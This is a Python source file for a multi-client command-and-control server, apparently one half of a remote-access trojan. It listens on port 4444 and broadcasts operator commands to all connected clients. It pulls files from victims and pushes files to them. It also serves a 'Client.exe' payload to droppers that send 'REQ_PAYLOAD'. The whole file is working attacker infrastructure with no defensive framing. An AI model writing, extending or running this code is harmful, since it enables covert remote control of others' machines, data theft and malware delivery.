import socket
import threading
import os


class Server:
    def __init__(self, bind_ip="0.0.0.0", bind_port=4444):
        self.bind_ip = bind_ip
        self.bind_port = bind_port
        self.clients = []           # list of connected client sockets
        self.clients_lock = threading.Lock()

    # ------ Remove client from list ------
    def remove_client(self, client_socket):
        try:
            with self.clients_lock:
                if client_socket in self.clients:
                    self.clients.remove(client_socket)
                client_socket.close()
        except Exception as e:
            print(f"[-] Error closing client socket: {e}")

    # ------ Send message with length prefix ------
    def send_msg(self, sock, msg):
        try:
            data = msg.encode('utf-8')
            size = len(data).to_bytes(4, 'big')
            sock.sendall(size + data)
        except Exception as e:
            print(f"[-] Error sending message to {sock.getpeername()}: {e}")
            self.remove_client(sock)

    # ------ Receive exact bytes ------
    def recv_exact(self, sock, n):
        data = b""
        while len(data) < n:
            chunk = sock.recv(n - len(data))
            if not chunk:
                raise ConnectionError("Client disconnected")
            data += chunk
        return data

    # ------ Receive full message ------
    def recv_msg(self, sock):
        size_bytes = self.recv_exact(sock, 4)
        size = int.from_bytes(size_bytes, 'big')
        data = self.recv_exact(sock, size)
        return data.decode('utf-8')
    
    # ------ Send and receive file ------
    def send_file(self, sock, filename):
        try:
            if not os.path.exists(filename):
                print(f"[-] File not found: {filename}")
                return
            print(f"[+] Sending {filename} to {sock.getpeername()}")
            size = os.path.getsize(filename)
            basename = os.path.basename(filename)
            self.send_msg(sock, f"FILE:{basename}:{size}")
            with open(filename, "rb") as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    sock.sendall(chunk)
            print(f"[+] Sent {filename}")
        except Exception as e:
            print(f"[-] Failed to send {filename}: {e}")

    # ------ Receive and save file ------
    def recv_file(self, sock, header, addr, save_folder="."):
        try: 
            _, filename, filesize = header.split(":")
            filesize = int(filesize)
            filepath = os.path.join(save_folder, os.path.basename(filename))

            print(f"[*] Receiving {filename} from {addr}...")
            with open(filepath, "wb") as f:
                remaining = filesize
                while remaining > 0:
                    chunk = sock.recv(min(4096, remaining))
                    if not chunk:
                        raise ConnectionError("connection closed during file transfer")
                    f.write(chunk)
                    remaining -= len(chunk)
        except Exception as e:
            print(f"[-] Error receiving file from {addr}: {e}")
            return
        print(f"[+] File saved as server_{filepath}")

    # ------ Handle one client ------
    def client_handler(self, client_socket, addr):
        print(f"[+] Client connected: {addr}")

        while True:
            try:
                msg = self.recv_msg(client_socket)
                
                # --- Handle Dropper Request ---
                if msg == "REQ_PAYLOAD":
                    try:
                        with open("Client.exe", "rb") as f:
                            payload_data = f.read()
                        self.send_msg(client_socket, str(len(payload_data)))
                        client_socket.sendall(payload_data)
                        print(f"[+] Sent payload.exe to {addr}")
                    except FileNotFoundError:
                        print("[-] Error: payload.exe not found on server.")
                    return # Dropper disconnects after download
                
                # --- Handle File Download from Client ---
                if msg.startswith("FILE:"):
                    self.recv_file(client_socket, msg, addr)
                    continue

                print(f"\n--- Output from {addr} ---")
                print(msg)
                print("--------------------------")
            except ConnectionError:
                print(f"[-] Client disconnected: {addr}")
                self.remove_client(client_socket)
                break

    # ------ Main server loop ------
    def start(self):
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.bind((self.bind_ip, self.bind_port))
        server_sock.listen(5)

        print(f"[+] Server listening on {self.bind_ip}:{self.bind_port}")

        # Thread to send commands to clients
        threading.Thread(target=self.command_input_loop, daemon=True).start()

        # Accept clients
        while True:
            client_socket, addr = server_sock.accept()
            with self.clients_lock:
                self.clients.append(client_socket)

            t = threading.Thread(target=self.client_handler, args=(client_socket, addr), daemon=True)
            t.start()

    # ------ Input loop to send commands ------
    def command_input_loop(self):
        while True:
            cmd = input("Command > ").strip()

            if not cmd:
                continue

            # --- Handle File Upload to Client (put) ---
            if cmd.startswith("send_file "):
                try:
                    filename = cmd[10:].strip()
                    if not os.path.exists(filename):
                        print(f"[-] File {filename} not found.")
                        continue
                except Exception as e:
                    print(f"Error preparing file: {e}")
                    continue
                with self.clients_lock:
                    if not self.clients:
                        print("No connected clients.")
                        continue
                    for sock in self.clients:
                        threading.Thread(target=self.send_file, args=(sock, filename), daemon=True).start()
                continue

            with self.clients_lock:
                if not self.clients:
                    print("No connected clients.")
                    continue

                for sock in self.clients:
                    try:
                        self.send_msg(sock, cmd)
                    except:
                        print("Failed to send command to a client.")
if __name__ == "__main__":
    server = Server()
    server.start()
    